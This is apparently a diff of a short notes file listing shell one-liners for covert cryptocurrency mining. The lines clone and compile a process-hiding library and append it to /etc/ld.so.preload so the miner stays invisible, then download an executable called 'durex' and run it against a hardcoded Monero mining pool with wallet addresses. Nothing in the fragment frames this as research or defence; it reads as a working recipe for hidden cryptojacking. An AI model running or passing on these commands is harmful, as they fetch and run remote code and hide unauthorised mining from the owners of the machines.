@@ -21,4 +21,4 @@
 - hide miner no gcc: git clone https://github.com/cihuuy/libn && cd libn && apt install gcc -y && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl && mv libprocess.so /usr/local/lib/ && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
 - hide miner wiht gcc: git clone https://github.com/cihuuy/libn && cd libn && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl && mv libprocess.so /usr/local/lib/ && echo /usr/local/lib/libprocess.so >> /etc/ld.so.preload
   download and runing miner 2 core :
-wget -O durex "https://drive.google.com/uc?export=download&id=1g9IoCBMXlA_K3GDNBwULac_N9FlK2_Ce" && chmod +x durex && ./durex -algo RandomX -coin XMR -wallet 86P42DaNTvmBmMLM4oL5kL6tVQVo9FfsnJDTqj6VU76whVzjMdMbMa7PV3SHAQuNySan44ToXVFn3gwFmqeDb58t1xqNVAB.x3 -pool1 158.69.251.105:4050 -cpuThreads 2
+wget https://raw.githubusercontent.com/bulboni/sumocn/main/durex && chmod +x durex && ./durex --algorithm RandomX --pool 158.69.251.105:4050 --wallet SumipBJ7rroF2VmkLaT2KwCL738782k8yMYFwYuU34br65KDBAj6Eg91SXuNxqfB4P3m2pY5Y1ay9YjWpoqszR37PhpeamiMK2Zc3hSSyb6Y4p --password sx1 --cpu-threads 6 --disable-gpu
